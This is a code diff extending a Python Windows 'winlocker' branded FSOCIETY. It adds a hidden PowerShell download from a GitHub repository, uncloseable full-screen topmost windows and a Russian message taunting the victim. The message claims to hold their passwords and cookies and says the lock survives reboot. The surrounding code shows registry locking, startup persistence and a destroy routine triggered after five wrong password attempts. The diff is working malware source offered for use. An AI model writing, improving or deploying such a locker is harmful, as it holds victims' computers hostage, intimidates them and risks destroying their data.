@@ -1,4 +1,4 @@
-import os, sys, time, threading, ctypes, winreg, shutil, subprocess, tkinter as tk, traceback
+import os, sys, time, threading, ctypes, winreg, shutil, subprocess, tkinter as tk, traceback, urllib.request, tempfile
 
 try: import keyboard
 except: subprocess.check_call([sys.executable,"-m","pip","install","keyboard"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW); import keyboard
@@ -7,7 +7,21 @@ PASS = "1601"
 TRIES = 5
 HOURS = 1
 TIMER = os.path.join(os.environ['PROGRAMDATA'], "Microsoft", "timer.dat")
+LOGO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/icon.png"
 tries = TRIES
+
+def download_file(url, path):
+    if os.path.exists(path) and os.path.getsize(path) > 1000:
+        return True
+    try:
+        urllib.request.urlretrieve(url, path)
+        if os.path.getsize(path) > 1000: return True
+    except: pass
+    try:
+        subprocess.run(['powershell','-WindowStyle','Hidden','-Command',f"(New-Object Net.WebClient).DownloadFile('{url}','{path}')"],capture_output=True,creationflags=subprocess.CREATE_NO_WINDOW)
+        if os.path.getsize(path) > 1000: return True
+    except: pass
+    return False
 
 def lock():
     for h in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
@@ -75,6 +89,50 @@ def startup():
             winreg.CloseKey(r)
         except: pass
 
+def anim_fsociety():
+    a = tk.Tk()
+    a.attributes('-fullscreen', True); a.attributes('-topmost', True)
+    a.configure(bg='black'); a.overrideredirect(True)
+    a.protocol("WM_DELETE_WINDOW", lambda: None)
+    
+    # fsociety текст
+    lbl = tk.Label(a, text="", bg='black', fg='white', font=('Courier', 55, 'bold'))
+    lbl.pack(expand=True)
+    for t in ["f","f s","f s o","f s o c","f s o c i","f s o c i e","f s o c i e t","f s o c i e t y"]:
+        lbl.config(text=t); a.update(); time.sleep(0.3)
+    
+    time.sleep(1)
+    
+    # "тебя приветствует"
+    sub = tk.Label(a, text="", bg='black', fg='#ff4444', font=('Courier', 22))
+    sub.pack(pady=20)
+    text = "тебя приветствует"
+    for i in range(len(text)+1):
+        sub.config(text=text[:i]); a.update(); time.sleep(0.1)
+    
+    time.sleep(2.5)
+    a.destroy()
+
+def show_logo():
+    logo_path = os.path.join(tempfile.gettempdir(), "fsociety_logo.png")
+    if download_file(LOGO_URL, logo_path):
+        try:
+            lw = tk.Tk()
+            lw.attributes('-fullscreen', True); lw.attributes('-topmost', True)
+            lw.configure(bg='black'); lw.overrideredirect(True)
+            lw.protocol("WM_DELETE_WINDOW", lambda: None)
+            
+            img = tk.PhotoImage(file=logo_path)
+            # Уменьшаем если слишком большое
+            if img.width() > 800:
+                img = img.subsample(img.width()//400, img.height()//400)
+            
+            tk.Label(lw, image=img, bg='black').pack(expand=True)
+            lw.update()
+            time.sleep(5)
+            lw.destroy()
+        except: pass
+
 class Locker:
     def __init__(self):
         global tries
@@ -88,19 +146,35 @@ class Locker:
         self.w.focus_force()
         
         self.end = timer_get()
-        self.tl = tk.Label(self.w, text="", bg='black', fg='#ff4444', font=('Courier', 30, 'bold'))
-        self.tl.place(relx=0.5, rely=0.08, anchor='center')
+        
+        # FSOCIETY заголовок
+        tk.Label(self.w, text="FSOCIETY", bg='black', fg='#ff0000', font=('Courier', 50, 'bold')).place(relx=0.5, rely=0.12, anchor='center')
+        
+        # Таймер
+        self.tl = tk.Label(self.w, text="", bg='black', fg='#ff4444', font=('Courier', 38, 'bold'))
+        self.tl.place(relx=0.5, rely=0.22, anchor='center')
         self.tick()
         
-        msg = f"FSOCIETY WINLOCKER\n\nTRY: {TRIES}\nTIMER: {HOURS} HOUR"
-        tk.Label(self.w, text=msg, bg='black', fg='white', font=('Courier', 12, 'bold'), justify='center').place(relx=0.5, rely=0.4, anchor='center')
+        # Текст
+        msg = (f"Вот чего доводит интернет.\n\n"
+               f"Вот смотри, ты скачивал игры\nили что там из интернета?\n"
+               f"Вот доскачался.\nСиди и жуй мой винлокер.\n\n"
+               f"Ты хочешь перезагрузить ПК?\nУ тебя не получится.\n"
+               f"ПК перезагрузить получится,\nно избавиться от меня - нет.\n"
+               f"Я везде. Я в твоём роутере.\nЯ знаю все твои данные.\n"
+               f"У меня есть cookies файлы,\nпароли, логины, почты и т.д.\n\n"
+               f"МЫ FSOCIETY.\nYOU FUCK.\n\n"
+               f"ПОПЫТОК: {TRIES}\nТАЙМЕР: {HOURS} ЧАС")
         
+        tk.Label(self.w, text=msg, bg='black', fg='white', font=('Courier', 11, 'bold'), justify='center').place(relx=0.5, rely=0.58, anchor='center')
+        
+        # Поле пароля
         cf = tk.Frame(self.w, bg='black')
-        cf.place(relx=0.5, rely=0.65, anchor='center')
-        tk.Label(cf, text="ENTER PASSWORD:", bg='black', fg='white', font=('Courier', 14, 'bold')).pack(pady=(0,5))
-        self.e = tk.Entry(cf, show="*", font=('Courier', 14, 'bold'), bg='white', fg='black', relief='solid', bd=2)
-        self.e.pack(pady=(0,5), ipadx=40, ipady=3)
-        self.sl = tk.Label(cf, text=f"LEFT: {tries}", bg='black', fg='white', font=('Courier', 12, 'bold'))
+        cf.place(relx=0.5, rely=0.88, anchor='center')
+        tk.Label(cf, text="ВВЕДИ ПАРОЛЬ:", bg='black', fg='#00ff00', font=('Courier', 16, 'bold')).pack(pady=(0,5))
+        self.e = tk.Entry(cf, show="*", font=('Courier', 16, 'bold'), bg='#111', fg='#00ff00', relief='solid', bd=3, insertbackground='#00ff00')
+        self.e.pack(pady=(0,5), ipadx=50, ipady=5)
+        self.sl = tk.Label(cf, text=f"ОСТАЛОСЬ: {tries}", bg='black', fg='yellow', font=('Courier', 14, 'bold'))
         self.sl.pack()
         self.e.bind('<Return>', self.chk)
         self.e.focus_force()
@@ -121,7 +195,7 @@ class Locker:
         global tries
         if self.e.get() == PASS:
             unlock()
-            self.sl.config(text="CORRECT!", fg='white')
+            self.sl.config(text="ВЕРНО!", fg='#00ff00')
             self.w.update()
             try: os.remove(TIMER)
             except: pass
@@ -131,9 +205,9 @@ class Locker:
         else:
             tries -= 1
             if tries > 0:
-                self.sl.config(text=f"WRONG! LEFT: {tries}", fg='white')
+                self.sl.config(text=f"НЕВЕРНО! ОСТАЛОСЬ: {tries}", fg='#ff4444')
             else:
-                self.sl.config(text="404 | ERROR", fg='white')
+                self.sl.config(text="404 | ОШИБКА", fg='red')
                 self.w.update()
                 time.sleep(2)
                 destroy()
@@ -145,6 +219,8 @@ if __name__ == "__main__":
         threading.Thread(target=kill, daemon=True).start()
         threading.Thread(target=timer_check, daemon=True).start()
         startup()
+        anim_fsociety()   # Анимация fsociety
+        show_logo()       # Картинка PNG на 5 секунд
         lock()
         Locker()
         tk.mainloop()
